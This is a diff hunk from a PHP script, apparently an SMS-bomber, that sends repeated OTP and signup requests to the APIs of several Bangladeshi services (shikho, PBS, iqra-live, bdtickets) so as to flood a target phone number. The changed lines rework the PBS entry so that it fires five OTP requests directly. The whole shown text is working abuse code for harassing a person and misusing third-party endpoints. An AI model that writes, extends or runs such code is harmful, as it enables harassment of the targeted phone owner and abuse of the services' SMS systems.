@@ -63,8 +63,11 @@ for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://
 for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"shikho_$i","url"=>"https://api.shikho.com/auth/v2/send/sms","data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],"headers"=>['Content-Type:application/json','Origin:https://shikho.com']];
 
 // পিবিএস (Fixed)
-for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"pbs_$i","url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","data"=>["userPhone"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://pbs.com.bd']];
-
+// 4. PBS (5 বার)
+for($i=1; $i<=5; $i++){
+    $results["pbs_$i"] = execute_request('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', 
+        ["userPhone" => $phone_11], ['Content-Type: application/json']);
+}
 // ইকরা (GET)
 for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"iqra_$i","url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,"method"=>"GET","headers"=>['Origin:https://iqra-live.com']];
 
